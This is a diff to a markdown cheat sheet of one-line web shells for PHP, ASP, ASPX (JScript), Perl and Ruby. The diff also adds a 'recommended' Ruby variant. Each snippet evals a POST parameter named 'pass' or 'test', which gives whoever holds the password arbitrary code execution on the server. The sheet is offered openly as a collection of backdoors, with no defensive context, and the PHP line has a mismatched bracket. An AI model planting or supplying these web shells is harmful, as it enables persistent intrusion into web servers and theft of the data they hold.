@@ -1,42 +1,48 @@
-PHP:
+# PHP
 
 ```
 <?php @eval($_POST['pass');?>
 ```
 
-ASP:
+# ASP
 
 ```
 <%eval request("pass")%>
 ```
 
-ASPX(JScript):
+# ASPX(JScript)
 
 ```
 <%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>
 ```
 
-ASPX(C#):
+# ASPX(C#)
 
 
-ASMX:
+# ASMX
 
 
-ASHX:
+# ASHX
 
-
-Perl:
+ 
+# Perl
 
 ```
 use CGI;eval(CGI->new->param('test'));
 ```
 
-Ruby:
+# Ruby
 
+Recommanded:
+
+```
+require 'uri'; $_POST = URI.decode_www_form(STDIN.read(ENV['CONTENT_LENGTH'].to_i)).to_h rescue {}; eval($_POST['pass']) if $_POST['pass']
+```
+
+---
+
+No recommanded:
 ```
 STDIN.read(ENV['CONTENT_LENGTH'].to_i).to_s =~ /pass=([^&]+)/; eval($1.gsub('+',' ').gsub(/%([a-fA-F0-9]{2})/){[$1.hex].pack('C')}) if $1
 ```
 
-```
-require 'uri'; $post = URI.decode_www_form(STDIN.read(ENV['CONTENT_LENGTH'].to_i)).to_h rescue {}; eval($post['pass']) if $post['pass']
-```
